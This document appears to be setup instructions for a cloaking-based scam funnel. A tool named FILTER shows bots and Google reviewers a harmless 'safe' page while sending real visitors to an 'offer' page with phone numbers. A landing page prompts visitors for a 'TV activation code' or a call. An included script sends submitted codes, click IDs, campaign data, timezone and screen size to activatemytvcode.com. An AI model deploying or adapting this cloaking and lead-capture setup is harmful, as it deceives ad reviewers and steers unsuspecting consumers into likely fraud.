────────────────────────────────────────

When the script runs, FILTER checks if the visitor is a real person 
or a bot/reviewer. It then responds with one of two URLs:

  - REAL VISITOR  → redirect to the OFFER URL (where you make money)
  - BOT/REVIEWER  → redirect to the SAFE URL (a harmless landing page)

You need two pages on this website:

  A) OFFER PAGE — the page real visitors land on. 
     This could be a phone number page, a form, or a redirect 
     to an affiliate offer. 
     URL path: /offer  (or whatever page you want real visitors to see)

  B) SAFE PAGE — the page bots and Google reviewers see. 
     This should look like a normal, innocent informational page 
     with no phone numbers or offers. 
     URL path: /safe  (or whatever page you want bots to see)

These URLs are already configured in the FILTER admin panel under:
  Sites → [your site] → General Tab → Offer URL and Safe URL

If you need to change them, update them there, not here.

STEP 3 — LEAD CAPTURE (ADD TO YOUR MAIN LANDING PAGE ONLY)
────────────────────────────────────────

On the main landing page where visitors enter their TV activation code 
or click to call, add this lead tracking script in the <head>:

<script>
(function(){
  var _h='https://activatemytvcode.com',
      _k='REPLACE_WITH_YOUR_API_KEY';

  // Call this when the visitor submits a code or form
  window.trackLead = function(code, utmSource, utmCampaign, gclid) {
    try {
      fetch(_h+'/api/track/lead', {
        method:'POST',
        headers:{'Content-Type':'application/json','X-Site-Key':_k},
        body: JSON.stringify({
          type:'code_submit',
          code: code || '',
          utm_source: utmSource || new URLSearchParams(location.search).get('utm_source') || '',
          utm_campaign: utmCampaign || new URLSearchParams(location.search).get('utm_campaign') || '',
          utm_medium: new URLSearchParams(location.search).get('utm_medium') || '',
          gclid: gclid || new URLSearchParams(location.search).get('gclid') || '',
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: screen.width+'x'+screen.height
        })
      }).catch(function(){});
    } catch(e) {}
  };

  // Call this when the visitor clicks the phone number / call button
  window.trackCall = function() {
    try {
      fetch(_h+'/api/track/lead', {
        method:'POST',
        headers:{'Content-Type':'application/json','X-Site-Key':_k},
        body: JSON.stringify({type:'call_click'})
      }).catch(function(){});
    } catch(e) {}
  };
})();
</script>

Then wire up the buttons:
  - When a form is submitted, call: window.trackLead(codeValue)
  - When the phone/call button is clicked, call: window.trackCall()
